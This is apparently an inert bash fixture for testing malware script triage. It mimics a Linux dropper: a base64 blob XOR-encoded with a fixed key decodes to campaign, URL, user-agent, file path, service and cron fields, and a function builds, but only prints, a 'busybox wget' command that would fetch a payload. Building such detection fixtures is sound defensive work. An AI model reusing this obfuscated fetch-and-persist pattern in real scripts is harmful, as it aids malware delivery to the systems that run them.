#!/usr/bin/env bash
  # Huntress Script Triage -- inert static-analysis fixture (bash_linux)
  readonly Material_0c30335e='yU+ZhQPLF9iKTd4R2YwZzRf3ixXSHdycXMgAwY0V4BTBlRXDE8yYAMsX2sQSygHRmx/HLd+eFcstx4wEzwfchQPLE8+cL9wd3ZcEgkPUmhHSAsmQF9EtwZ1N3BPFiRHWFcbUEtsQnMFJjhGRmgzKAMTEGMsG2IpKkF3KnRKLSpHIE4YRhpwI3h/YlRWRG8aPEdMbzNZBixedykmHEIaKGMMH25wC4BPPnB7LT+CMHssAzYoD8xPK1hLbEJzBSY4RkZoM2RvEnC/PE9yRTZAGxYlf1wfGjQLaAdvUE94RwJxfkQHcmBfaX8qdEotKkcgThhE='
  readonly Codec_0c30335e='base64_literal|repeating_key_xor|bf,72,a8,f9,70'

  Load_0c30335e() {
    v_a19c=()
    local v_f602
    while read -r v_f602; do [[ -n "$v_f602" ]] && v_a19c+=("$v_f602"); done < <(printf '%s' "${Material_0c30335e}" | base64 --decode | od -An -v -tu1 | tr -s ' ' '\n' | sed '/^$/d')
  }

  Decode_0c30335e() {
    v_b27e=()
    local -a key_bytes=(191 114 168 249 112)
    local v_e598
    for ((v_e598=0; v_e598<${#v_a19c[@]}; v_e598++)); do
      v_b27e+=("$((v_a19c[v_e598] ^ key_bytes[v_e598 % ${#key_bytes[@]}]))")
    done
  }

  Recover_0c30335e() {
    local -a v_a19c v_b27e
    local v_c304 v_d41a v_b803 v_e598
    local -a compass=(north south); v_d41a="$(IFS=:; printf '%s' "${compass[*]}")"
    Load_0c30335e
    if ! Decode_0c30335e; then return 71; fi
    v_c304=''
    local octal character
    for v_e598 in "${!v_b27e[@]}"; do
      printf -v octal '%03o' "${v_b27e[v_e598]}"
      printf -v character '%b' "\\$octal"
      v_c304+="$character"
    done
    printf '%s\n' "$v_c304"
  }

  Inspect_0c30335e() { local recovered field; local -a fields; recovered="$(Recover_0c30335e)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }

  Plan_0c30335e() {
    local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
    descriptor="$(Inspect_0c30335e)"
    local -a fields
    IFS='|' read -r -a fields <<< "$descriptor"
    for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
    local -a request_command=(busybox wget -qO "$file_path" "$url")
    declare -p request_command
  }

  if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_0c30335e; fi
